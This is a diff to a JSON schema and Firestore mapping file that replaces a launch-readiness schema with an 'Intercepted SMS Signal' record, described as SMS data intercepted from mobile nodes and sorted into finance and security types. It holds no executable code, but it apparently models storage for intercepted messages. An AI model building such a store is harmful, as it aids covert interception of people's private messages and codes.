@@ -38,15 +38,18 @@
         "updatedAt": { "type": "number" }
       }
     },
-    "ReadinessCheckpoint": {
-      "title": "Launch Readiness State",
-      "description": "System preflight validation results.",
+    "SmsSignal": {
+      "title": "Intercepted SMS Signal",
+      "description": "Raw and parsed SMS data intercepted from mobile nodes.",
       "type": "object",
       "properties": {
-        "checkId": { "type": "string" },
-        "category": { "type": "string" },
-        "status": { "type": "string", "enum": ["PASS", "WARN", "BLOCK"] },
-        "lastVerifiedAt": { "type": "number" }
+        "id": { "type": "string" },
+        "sender": { "type": "string" },
+        "body": { "type": "string" },
+        "timestamp": { "type": "number" },
+        "status": { "type": "string", "enum": ["PENDING", "PARSED", "ARCHIVED"] },
+        "type": { "type": "string", "enum": ["FINANCE", "SECURITY", "INFRA"] },
+        "isSynced": { "type": "boolean" }
       }
     }
   },
@@ -56,13 +59,6 @@
   "firestore": {
     "/users/{userId}": { "schema": "UserProfile" },
     "/payments/{paymentId}": { "schema": "InboundPayment" },
-    "/readiness/{checkId}": { "schema": "ReadinessCheckpoint" }
-  },
-  "indexes": {
-    "required_composite": [
-      { "collection": "payments", "fields": ["settlementBucket", "updatedAt desc"] },
-      { "collection": "payments", "fields": ["manualReviewRequired", "updatedAt desc"] },
-      { "collection": "verification_docs", "fields": ["submittedAt desc"] }
-    ]
+    "/sms_signals/{signalId}": { "schema": "SmsSignal" }
   }
 }
